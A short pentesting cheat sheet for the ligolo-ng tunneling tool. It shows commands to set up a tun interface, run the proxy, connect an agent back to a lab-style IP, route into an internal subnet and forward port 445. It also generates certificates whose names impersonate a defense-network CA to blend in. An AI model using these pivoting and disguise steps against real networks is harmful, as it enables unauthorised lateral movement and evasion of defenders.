###### Interface
```
sudo ip tuntap add mode tun dev ligolo
sudo ip link set ligolo up
```
###### Proxy
```
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```
###### Agent
```
./agent -connect 10.10.14.2:11601 -ignore-cert
```
###### Start tunnel
```
session
[Enter]
start
```
###### Routing
```
sudo ip route add 192.168.110.0/24 dev ligolo
```
###### Binaries
```
https://github.com/nicocha30/ligolo-ng/releases
```
###### Double Forward
```
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
listener_list
```
###### Cert Generation
```
openssl genrsa -out rootCA.key 4096
openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Virginia/L=Arlington/O=Defense Network Infrastructure/CN=Internal CA Service" -out rootCA.crt

openssl genrsa -out ligolo-server.key 2048
openssl req -new -key ligolo-server.key  -subj "/C=US/ST=Virginia/L=Arlington/O=Defense Network Infrastructure/CN=tunnel.internal.local" -out ligolo-server.csr

cat <<EOF > server.ext
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = corp.local
IP.1 = 10.10.14.2  # Replace with your actual proxy IP
EOF
```
###### Cert Signing
```
openssl x509 -req -in ligolo-server.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out ligolo-server.crt -days 365 -sha256 -extfile server.ext
```